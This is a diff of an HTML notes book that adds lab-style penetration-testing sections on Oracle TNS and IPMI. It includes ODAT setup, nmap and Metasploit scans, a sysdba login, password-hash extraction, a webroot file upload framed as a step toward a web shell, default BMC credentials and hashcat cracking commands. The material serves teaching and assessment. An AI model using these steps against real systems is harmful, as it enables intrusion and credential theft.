@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-ee1c9ec2.js";
+            window.path_to_searchindex_js = "searchindex-8cc462dd.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-5dcfcacf.js"></script>
+        <script src="toc-2a06c6b1.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -351,6 +351,7 @@
 <ul>
 <li><a href="#mysql">MySQL</a></li>
 <li><a href="#mssql">MSSQL</a></li>
+<li><a href="#oracle-tns">Oracle</a></li>
 </ul>
 </li>
 <li><a href="devops/README.html">DevOps</a>
@@ -439,6 +440,7 @@
 <li><a href="#tls">TLS</a></li>
 <li><a href="#udp-1">UDP</a></li>
 <li><a href="#websockets">WebSockets</a></li>
+<li><a href="#ipmi">IPMI</a></li>
 </ul>
 </li>
 <li><a href="redis/README.html">Redis</a>
@@ -12665,6 +12667,7 @@ func main() {
 <ul>
 <li><a href="#mysql">mysql</a></li>
 <li><a href="#mssql">mssql</a></li>
+<li><a href="#oracle-tns">oracle</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="mysql"><a class="header" href="#mysql">MySQL</a></h1>
@@ -12998,6 +13001,268 @@ Transactions
 <li><strong>Principle of least privilege</strong>: Follow the principle of least privilege when granting user permissions</li>
 <li><strong>Regular updates</strong>: Keep MSSQL server updated with the latest security patches</li>
 <li><strong>Audit logging</strong>: Enable audit logging to track database access and changes</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="oracle-tns"><a class="header" href="#oracle-tns">Oracle TNS</a></h1>
+<p>The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.</p>
+<p>Over time, TNS has been updated to support newer technologies, including IPv6 and SSL/TLS encryption which makes it more suitable for the following purposes:</p>
+<ul>
+<li><strong>Name resolution</strong>: Resolves service names to network addresses</li>
+<li><strong>Connection management</strong>: Manages connections between clients and database instances</li>
+<li><strong>Load balancing</strong>: Distributes client connections across multiple database instances</li>
+<li><strong>Security</strong>: Provides encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer</li>
+</ul>
+<p>This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.</p>
+<h2 id="oracle-tns-clients"><a class="header" href="#oracle-tns-clients">Oracle TNS Clients</a></h2>
+<p>Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. Common clients include:</p>
+<ul>
+<li><strong>SQL*Plus</strong>: Command-line interface for Oracle databases</li>
+<li><strong>ODAT (Oracle Database Attacking Tool)</strong>: Open-source penetration testing tool written in Python</li>
+<li><strong>Oracle SQL Developer</strong>: GUI-based database development tool</li>
+<li><strong>Oracle Enterprise Manager</strong>: Web-based management interface</li>
+</ul>
+<h2 id="default-configuration-2"><a class="header" href="#default-configuration-2">Default Configuration</a></h2>
+<p>The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the TCP/1521 port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including TCP/IP, UDP, IPX/SPX, and AppleTalk. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g.</p>
+<p>The default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called <code>tnsnames.ora</code> and <code>listener.ora</code> and are typically located in the <code>$ORACLE_HOME/network/admin</code> directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.</p>
+<p>There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, <code>CHANGE_ON_INSTALL</code>, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, <code>dbsnmp</code> that we should remember when we come across this one. Another example would be that many organizations still use the finger service together with Oracle, which can put Oracle’s service at risk and make it vulnerable when we have the required knowledge of a home directory.</p>
+<h3 id="tnsnamesora"><a class="header" href="#tnsnamesora">tnsnames.ora</a></h3>
+<p>Each database or service has a unique entry in the <code>tnsnames.ora</code> file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. The client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses.</p>
+<p>Example <code>tnsnames.ora</code> file:</p>
+<pre><code class="language-txt">ORCL =
+  (DESCRIPTION =
+    (ADDRESS_LIST =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+    )
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = orcl)
+    )
+  )
+</code></pre>
+<p>Here we can see a service called ORCL, which is listening on port TCP/1521 on the IP address 10.129.11.102. Clients should use the service name <code>orcl</code> when connecting to the service. However, the <code>tnsnames.ora</code> file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.</p>
+<h3 id="listenerora"><a class="header" href="#listenerora">listener.ora</a></h3>
+<p>The <code>listener.ora</code> file is a server-side configuration file that defines the listener process’s properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.</p>
+<p>Example <code>listener.ora</code> file:</p>
+<pre><code class="language-txt">SID_LIST_LISTENER =
+  (SID_LIST =
+    (SID_DESC =
+      (SID_NAME = PDB1)
+      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
+      (GLOBAL_DBNAME = PDB1)
+      (SID_DIRECTORY_LIST =
+        (SID_DIRECTORY =
+          (DIRECTORY_TYPE = TNS_ADMIN)
+          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
+        )
+      )
+    )
+  )
+
+LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+ADR_BASE_LISTENER = C:\oracle
+</code></pre>
+<p>In short, the client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses, while the listener process uses the <code>listener.ora</code> file to determine the services it should listen to and the behavior of the listener.</p>
+<p>Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the <code>$ORACLE_HOME/sqldeveloper</code> directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.</p>
+<h2 id="configuration-settings"><a class="header" href="#configuration-settings">Configuration Settings</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Setting</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>DESCRIPTION</code></td><td>A descriptor that provides a name for the database and its connection type.</td></tr>
+<tr><td><code>ADDRESS</code></td><td>The network address of the database, which includes the hostname and port number.</td></tr>
+<tr><td><code>PROTOCOL</code></td><td>The network protocol used for communication with the server</td></tr>
+<tr><td><code>PORT</code></td><td>The port number used for communication with the server</td></tr>
+<tr><td><code>CONNECT_DATA</code></td><td>Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.</td></tr>
+<tr><td><code>INSTANCE_NAME</code></td><td>The name of the database instance the client wants to connect.</td></tr>
+<tr><td><code>SERVICE_NAME</code></td><td>The name of the service that the client wants to connect to.</td></tr>
+<tr><td><code>SERVER</code></td><td>The type of server used for the database connection, such as dedicated or shared.</td></tr>
+<tr><td><code>USER</code></td><td>The username used to authenticate with the database server.</td></tr>
+<tr><td><code>PASSWORD</code></td><td>The password used to authenticate with the database server.</td></tr>
+<tr><td><code>SECURITY</code></td><td>The type of security for the connection.</td></tr>
+<tr><td><code>VALIDATE_CERT</code></td><td>Whether to validate the certificate using SSL/TLS.</td></tr>
+<tr><td><code>SSL_VERSION</code></td><td>The version of SSL/TLS to use for the connection.</td></tr>
+<tr><td><code>CONNECT_TIMEOUT</code></td><td>The time limit in seconds for the client to establish a connection to the database.</td></tr>
+<tr><td><code>RECEIVE_TIMEOUT</code></td><td>The time limit in seconds for the client to receive a response from the database.</td></tr>
+<tr><td><code>SEND_TIMEOUT</code></td><td>The time limit in seconds for the client to send a request to the database.</td></tr>
+<tr><td><code>SQLNET.EXPIRE_TIME</code></td><td>The time limit in seconds for the client to detect a connection has failed.</td></tr>
+<tr><td><code>TRACE_LEVEL</code></td><td>The level of tracing for the database connection.</td></tr>
+<tr><td><code>TRACE_DIRECTORY</code></td><td>The directory where the trace files are stored.</td></tr>
+<tr><td><code>TRACE_FILE_NAME</code></td><td>The name of the trace file.</td></tr>
+<tr><td><code>LOG_FILE</code></td><td>The file where the log information is stored.</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="setting-up-tools"><a class="header" href="#setting-up-tools">Setting Up Tools</a></h2>
+<p>Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our Pwnbox instance in case it does not have these already. Here is a list of commands that does all of that:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+sudo mkdir -p /opt/oracle
+sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
+sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
+export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
+export PATH=$LD_LIBRARY_PATH:$PATH
+source ~/.bashrc
+cd ~
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+pip install python-libnmap
+git submodule init
+git submodule update
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+</code></pre>
+<p>After that, we can try to determine if the installation was successful by running the following command:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ ./odat.py -h
+
+usage: odat.py [-h] [--version]
+               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
+               ...
+
+            _  __   _  ___ 
+           / \|  \ / \|_ _|
+          ( o ) o ) o || | 
+           \_/|__/|_n_||_| 
+-------------------------------------------
+  _        __           _           ___ 
+ / \      |  \         / \         |_ _|
+( o )       o )         o |         | | 
+ \_/racle |__/atabase |_n_|ttacking |_|ool 
+-------------------------------------------
+
+By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
+...SNIP...
+</code></pre>
+<p>Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.</p>
+<h2 id="footprinting-oracle-tns-services"><a class="header" href="#footprinting-oracle-tns-services">Footprinting Oracle TNS Services</a></h2>
+<p>There are many reasons why an Oracle TNS server could be accessed from an external network. Nevertheless, it is far from being a best practice, and databases that can be reached externally are often found. Usually, the Oracle TNS server runs on TCP port 1521.</p>
+<h3 id="scanning-oracle-tns-server"><a class="header" href="#scanning-oracle-tns-server">Scanning Oracle TNS Server</a></h3>
+<p><code>nmap</code> can be used to scan and enumerate Oracle TNS servers:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
+Nmap scan report for 10.129.204.235
+Host is up (0.0041s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
+</code></pre>
+<p>We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (SID) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database’s data. When a client connects to an Oracle database, it specifies the database’s SID along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the <code>tnsnames.ora</code> file is used.</p>
+<p>The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual database instances.</p>
+<h2 id="oracle-rdbms---database-enumeration"><a class="header" href="#oracle-rdbms---database-enumeration">Oracle RDBMS - Database Enumeration</a></h2>
+<p>Once we have access to an Oracle database, we can connect using SQL*Plus:</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
+
+SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
+Version 21.4.0.0.0
+
+Copyright (c) 1982, 2021, Oracle. All rights reserved.
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+
+SQL&gt; select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
+SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
+SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
+SYS                            AQ_USER_ROLE                   YES YES NO
+SYS                            AUTHENTICATEDUSER              YES YES NO
+SYS                            CONNECT                        YES YES NO
+SYS                            CTXAPP                         YES YES NO
+SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
+SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
+SYS                            DBA                            YES YES NO
+SYS                            DBFS_ROLE                      YES YES NO
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS                            DELETE_CATALOG_ROLE            YES YES NO
+SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
+...SNIP...
+</code></pre>
+<p>We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the <code>sys.user$</code> and try to crack them offline.</p>
+<h2 id="oracle-rdbms---extract-password-hashes"><a class="header" href="#oracle-rdbms---extract-password-hashes">Oracle RDBMS - Extract Password Hashes</a></h2>
+<p>The query for extracting password hashes would look like the following:</p>
+<pre><code class="language-bash">SQL&gt; select name, password from sys.user$;
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+SYS                            FBA343E7D6C8BC9D
+PUBLIC
+CONNECT
+RESOURCE
+DBA
+SYSTEM                         B5073FE1DE351687
+SELECT_CATALOG_ROLE
+EXECUTE_CATALOG_ROLE
+DELETE_CATALOG_ROLE
+OUTLN                          4A3BA55E08595C81
+EXP_FULL_DATABASE
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+IMP_FULL_DATABASE
+LOGSTDBY_ADMINISTRATOR
+...SNIP...
+</code></pre>
+<h2 id="oracle-rdbms---file-upload"><a class="header" href="#oracle-rdbms---file-upload">Oracle RDBMS - File Upload</a></h2>
+<p>Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>OS</th><th>Path</th></tr>
+</thead>
+<tbody>
+<tr><td>Linux</td><td><code>/var/www/html</code></td></tr>
+<tr><td>Windows</td><td><code>C:\inetpub\wwwroot</code></td></tr>
+</tbody>
+</table>
+</div>
+<p>First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ echo "Oracle File Upload Test" &gt; testing.txt
+rnemeth@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
+[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
+</code></pre>
+<p>Finally, we can test if the file upload approach worked with curl. Therefore, we will use a GET <code>http://&lt;IP&gt;</code> request, or we can visit via browser.</p>
+<pre><code class="language-bash">rnemeth@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
+
+Oracle File Upload Test
+</code></pre>
+<h2 id="security-best-practices-2"><a class="header" href="#security-best-practices-2">Security Best Practices</a></h2>
+<p>When setting up an Oracle TNS server, it is important to follow security best practices:</p>
+<ul>
+<li><strong>Strong passwords</strong>: Use strong passwords for Oracle users, especially default accounts. Change default passwords like <code>CHANGE_ON_INSTALL</code> and <code>dbsnmp</code></li>
+<li><strong>Network access</strong>: Restrict network access to Oracle TNS servers; avoid exposing them to public networks unless necessary</li>
+<li><strong>Encryption</strong>: Enable SSL/TLS encryption for connections to prevent data interception</li>
+<li><strong>Configuration file permissions</strong>: Ensure configuration files (<code>tnsnames.ora</code>, <code>listener.ora</code>) have proper permissions to prevent unauthorized access</li>
+<li><strong>Remote management</strong>: Disable remote management in Oracle 10g/11g+ unless specifically required</li>
+<li><strong>PL/SQL Exclusion List</strong>: Use PL/SQL Exclusion Lists to restrict access to sensitive packages</li>
+<li><strong>Listener security</strong>: Configure listener security settings to only accept connections from authorized hosts</li>
+<li><strong>Regular updates</strong>: Keep Oracle database software updated with the latest security patches</li>
+<li><strong>Audit logging</strong>: Enable audit logging to track database access and changes</li>
+<li><strong>Principle of least privilege</strong>: Follow the principle of least privilege when granting user permissions</li>
+<li><strong>SID protection</strong>: Use strong, non-default SIDs and avoid exposing SID information unnecessarily</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="devops"><a class="header" href="#devops">DevOps</a></h1>
@@ -17308,6 +17573,7 @@ spec:
 <li><a href="#tls">tls</a></li>
 <li><a href="#udp-1">udp</a></li>
 <li><a href="networking/protocols/websocket.html">websocket</a></li>
+<li><a href="#ipmi">IPMI</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="browser-networking"><a class="header" href="#browser-networking">Browser Networking</a></h1>
@@ -17908,6 +18174,7 @@ func main() {
 <li><a href="#tls">tls</a></li>
 <li><a href="#udp-1">udp</a></li>
 <li><a href="networking/protocols/websocket.html">websocket</a></li>
+<li><a href="#ipmi">IPMI</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="dns-2"><a class="header" href="#dns-2">DNS</a></h1>
@@ -18181,7 +18448,7 @@ PORT   STATE SERVICE VERSION
 <li>Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes.</li>
 <li>SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port 143 or an alternative port such as 993.</li>
 </ul>
-<h2 id="default-configuration-2"><a class="header" href="#default-configuration-2">Default Configuration</a></h2>
+<h2 id="default-configuration-3"><a class="header" href="#default-configuration-3">Default Configuration</a></h2>
 <p>Both IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages <code>dovecot-imapd</code>, and <code>dovecot-pop3d</code> using apt and play around with the configurations and experiment.</p>
 <p>In the documentation of Dovecot, we can find the individual core settings and service configuration options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.</p>
 <h2 id="imap-commands"><a class="header" href="#imap-commands">IMAP Commands</a></h2>
@@ -18815,6 +19082,129 @@ iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64"
 <h1 id="udp-1"><a class="header" href="#udp-1">UDP</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="websockets"><a class="header" href="#websockets">WebSockets</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ipmi"><a class="header" href="#ipmi">IPMI</a></h1>
+<p>Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host’s BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system’s hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host.</p>
+<h2 id="common-use-cases"><a class="header" href="#common-use-cases">Common Use Cases</a></h2>
+<p>IPMI is typically used in three ways:</p>
+<ul>
+<li>Before the OS has booted to modify BIOS settings</li>
+<li>When the host is fully powered down</li>
+<li>Access to a host after a system failure</li>
+</ul>
+<p>When not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.</p>
+<h2 id="history-and-support"><a class="header" href="#history-and-support">History and Support</a></h2>
+<p>The IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band.</p>
+<h2 id="ipmi-components"><a class="header" href="#ipmi-components">IPMI Components</a></h2>
+<p>To function, IPMI requires the following components:</p>
+<ul>
+<li><strong>Baseboard Management Controller (BMC)</strong> - A micro-controller and essential component of an IPMI</li>
+<li><strong>Intelligent Chassis Management Bus (ICMB)</strong> - An interface that permits communication from one chassis to another</li>
+<li><strong>Intelligent Platform Management Bus (IPMB)</strong> - extends the BMC</li>
+<li><strong>IPMI Memory</strong> - stores things such as the system event log, repository store data, and more</li>
+<li><strong>Communications Interfaces</strong> - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus</li>
+</ul>
+<h2 id="footprinting-the-service-2"><a class="header" href="#footprinting-the-service-2">Footprinting the Service</a></h2>
+<p>IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host’s motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC.</p>
+<p>The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system.</p>
+<p>Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.</p>
+<h3 id="nmap-version-detection"><a class="header" href="#nmap-version-detection">Nmap Version Detection</a></h3>
+<p>Below is a sample Nmap scan using the Nmap ipmi-version NSE script to footprint the service:</p>
+<pre><code class="language-bash">[!bash!]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
+Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
+Host is up (0.00064s latency).
+
+PORT    STATE SERVICE
+623/udp open  asf-rmcp
+| ipmi-version:
+|   Version:
+|     IPMI-2.0
+|   UserAuth:
+|   PassAuth: auth_user, non_null_user
+|_  Level: 2.0
+MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
+</code></pre>
+<p>Here, we can see that the IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol.</p>
+<h3 id="metasploit-version-scan"><a class="header" href="#metasploit-version-scan">Metasploit Version Scan</a></h3>
+<p>We can also use the Metasploit scanner module IPMI Information Discovery (<code>auxiliary/scanner/ipmi/ipmi_version</code>):</p>
+<pre><code class="language-bash">[!bash!]$ msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version 
+msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options 
+
+Module options (auxiliary/scanner/ipmi/ipmi_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  256              yes       The number of hosts to probe in each set
+   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT      623              yes       The target port (UDP)
+   THREADS    10               yes       The number of concurrent threads
+
+
+msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run
+
+[*] Sending IPMI requests to 10.129.42.195-&gt;10.129.42.195 (1 hosts)
+[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<h2 id="default-credentials"><a class="header" href="#default-credentials">Default Credentials</a></h2>
+<p>During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Product</th><th>Username</th><th>Password</th></tr>
+</thead>
+<tbody>
+<tr><td>Dell iDRAC</td><td>root</td><td>calvin</td></tr>
+<tr><td>HP iLO</td><td>Administrator</td><td>randomized 8-character string consisting of numbers and uppercase letters</td></tr>
+<tr><td>Supermicro IPMI</td><td>ADMIN</td><td>ADMIN</td></tr>
+</tbody>
+</table>
+</div>
+<p>It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>
+<h2 id="dangerous-settings-4"><a class="header" href="#dangerous-settings-4">Dangerous Settings</a></h2>
+<p>If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user’s password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300.</p>
+<p>In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command:</p>
+<pre><code class="language-bash">[!bash!]$ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+</code></pre>
+<p>This tries all combinations of upper case letters and numbers for an eight-character password.</p>
+<p>There is no direct “fix” to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.</p>
+<h3 id="metasploit-hash-dumping"><a class="header" href="#metasploit-hash-dumping">Metasploit Hash Dumping</a></h3>
+<p>To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module:</p>
+<pre><code class="language-bash">[!bash!]$ msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; show options 
+
+Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
+
+   Name                 Current Setting                                                    Required  Description
+   ----                 ---------------                                                    --------  -----------
+   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
+   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
+   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
+   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
+   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT                623                                                                yes       The target port
+   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
